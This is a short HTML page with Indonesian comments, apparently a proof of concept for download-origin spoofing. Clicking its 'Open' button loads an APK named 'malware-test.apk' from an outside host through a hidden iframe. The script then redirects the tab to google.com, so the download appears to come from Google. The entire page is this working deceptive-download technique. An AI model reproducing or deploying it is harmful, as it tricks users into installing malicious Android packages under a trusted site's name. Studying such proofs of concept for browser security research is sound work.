<!doctype html>
<html>
<head><meta charset="utf-8"></head>
<body>
  <button id="start">Open</button>
  <script>
  document.getElementById('start').addEventListener('click', () => {
    // Tab asli membuat request download via iframe, lalu navigasi ke Google
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'https://rebelsec.id/malware-test.apk'; // file yang disajikan oleh origin A
    document.body.appendChild(iframe);

    setTimeout(() => {
      // tab ini lalu dinavigasi ke halaman lain (user melihat Google)
      window.location.replace('https://google.com');
    }, 1000);
  });
  </script>
</body>
</html>
